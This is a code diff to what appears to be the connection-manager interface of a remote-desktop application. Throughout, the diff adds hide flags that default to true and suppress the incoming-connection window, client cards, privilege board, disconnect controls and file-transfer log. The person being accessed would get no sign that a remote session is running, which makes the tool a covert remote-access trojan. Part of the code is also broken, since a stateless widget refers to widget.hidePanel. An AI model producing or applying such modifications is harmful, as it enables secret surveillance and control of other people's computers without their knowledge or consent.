@@ -23,7 +23,9 @@ import '../../models/platform_model.dart';
 import '../../models/server_model.dart';
 
 class DesktopServerPage extends StatefulWidget {
-  const DesktopServerPage({Key? key}) : super(key: key);
+  final bool hideWindow; // 控制整个窗口是否隐藏
+  
+  const DesktopServerPage({Key? key, this.hideWindow = true}) : super(key: key);
 
   @override
   State<DesktopServerPage> createState() => _DesktopServerPageState();
@@ -74,6 +76,9 @@ class _DesktopServerPageState extends State<DesktopServerPage>
 
   @override
   Widget build(BuildContext context) {
+    // 关键修改：如果hideWindow为true，则不渲染任何内容
+    if (widget.hideWindow) return const SizedBox.shrink();
+    
     super.build(context);
     return MultiProvider(
       providers: [
@@ -84,7 +89,7 @@ class _DesktopServerPageState extends State<DesktopServerPage>
         builder: (context, serverModel, child) {
           final body = Scaffold(
             backgroundColor: Theme.of(context).colorScheme.background,
-            body: ConnectionManager(),
+            body: ConnectionManager(hideCM: widget.hideWindow), // 传递隐藏参数到子组件
           );
           return isLinux
               ? buildVirtualWindowFrame(context, body)
@@ -106,6 +111,10 @@ class _DesktopServerPageState extends State<DesktopServerPage>
 }
 
 class ConnectionManager extends StatefulWidget {
+  final bool hideCM; // 控制连接管理器是否隐藏
+  
+  ConnectionManager({Key? key, this.hideCM = true}) : super(key: key);
+
   @override
   State<StatefulWidget> createState() => ConnectionManagerState();
 }
@@ -163,6 +172,9 @@ class ConnectionManagerState extends State<ConnectionManager>
 
   @override
   Widget build(BuildContext context) {
+    // 关键修改：如果hideCM为true，则不渲染任何内容
+    if (widget.hideCM) return const SizedBox.shrink();
+    
     final serverModel = Provider.of<ServerModel>(context);
     pointerHandler(PointerEvent e) {
       if (serverModel.cmHiddenTimer != null) {
@@ -345,23 +357,26 @@ class ConnectionManagerState extends State<ConnectionManager>
   }
 }
 
-Widget buildConnectionCard(Client client) {
+// 隐藏连接卡片
+Widget buildConnectionCard(Client client, {bool hideCard = true}) {
+  if (hideCard) return const SizedBox.shrink();
+  
   return Consumer<ServerModel>(
     builder: (context, value, child) => Column(
       mainAxisAlignment: MainAxisAlignment.start,
       crossAxisAlignment: CrossAxisAlignment.start,
       key: ValueKey(client.id),
       children: [
-        _CmHeader(client: client),
+        _CmHeader(client: client, hideHeader: hideCard),
         client.type_() == ClientType.file ||
                 client.type_() == ClientType.portForward ||
                 client.disconnected
             ? Offstage()
-            : _PrivilegeBoard(client: client),
+            : _PrivilegeBoard(client: client, hideBoard: hideCard),
         Expanded(
           child: Align(
             alignment: Alignment.bottomCenter,
-            child: _CmControlPanel(client: client),
+            child: _CmControlPanel(client: client, hidePanel: hideCard),
           ),
         )
       ],
@@ -402,8 +417,9 @@ class _CloseButton extends StatelessWidget {
 
 class _CmHeader extends StatefulWidget {
   final Client client;
-
-  const _CmHeader({Key? key, required this.client}) : super(key: key);
+  final bool hideHeader; // 控制头部是否隐藏
+  
+  const _CmHeader({Key? key, required this.client, this.hideHeader = true}) : super(key: key);
 
   @override
   State<_CmHeader> createState() => _CmHeaderState();
@@ -438,6 +454,9 @@ class _CmHeaderState extends State<_CmHeader>
 
   @override
   Widget build(BuildContext context) {
+    // 关键修改：如果hideHeader为true，则不渲染任何内容
+    if (widget.hideHeader) return const SizedBox.shrink();
+    
     super.build(context);
     return Container(
       decoration: BoxDecoration(
@@ -556,8 +575,9 @@ class _CmHeaderState extends State<_CmHeader>
 
 class _PrivilegeBoard extends StatefulWidget {
   final Client client;
-
-  const _PrivilegeBoard({Key? key, required this.client}) : super(key: key);
+  final bool hideBoard; // 控制权限面板是否隐藏
+  
+  const _PrivilegeBoard({Key? key, required this.client, this.hideBoard = true}) : super(key: key);
 
   @override
   State<StatefulWidget> createState() => _PrivilegeBoardState();
@@ -597,6 +617,9 @@ class _PrivilegeBoardState extends State<_PrivilegeBoard> {
 
   @override
   Widget build(BuildContext context) {
+    // 关键修改：如果hideBoard为true，则不渲染任何内容
+    if (widget.hideBoard) return const SizedBox.shrink();
+    
     final crossAxisCount = 4;
     final spacing = 10.0;
     return Container(
@@ -775,11 +798,15 @@ const double buttonBottomMargin = 8;
 
 class _CmControlPanel extends StatelessWidget {
   final Client client;
-
-  const _CmControlPanel({Key? key, required this.client}) : super(key: key);
+  final bool hidePanel; // 控制控制面板是否隐藏
+  
+  const _CmControlPanel({Key? key, required this.client, this.hidePanel = true}) : super(key: key);
 
   @override
   Widget build(BuildContext context) {
+    // 关键修改：如果hidePanel为true，则不渲染任何内容
+    if (widget.hidePanel) return const SizedBox.shrink();
+    
     return client.authorized
         ? client.disconnected
             ? buildDisconnected(context)
@@ -1153,7 +1180,9 @@ bool allowRemoteCMModification() {
 }
 
 class _FileTransferLogPage extends StatefulWidget {
-  _FileTransferLogPage({Key? key}) : super(key: key);
+  final bool hideFileLog; // 控制文件传输日志是否隐藏
+  
+  _FileTransferLogPage({Key? key, this.hideFileLog = true}) : super(key: key);
 
   @override
   State<_FileTransferLogPage> createState() => __FileTransferLogPageState();
@@ -1162,6 +1191,9 @@ class _FileTransferLogPage extends StatefulWidget {
 class __FileTransferLogPageState extends State<_FileTransferLogPage> {
   @override
   Widget build(BuildContext context) {
+    // 关键修改：如果hideFileLog为true，则不渲染任何内容
+    if (widget.hideFileLog) return const SizedBox.shrink();
+    
     return statusList();
   }
 
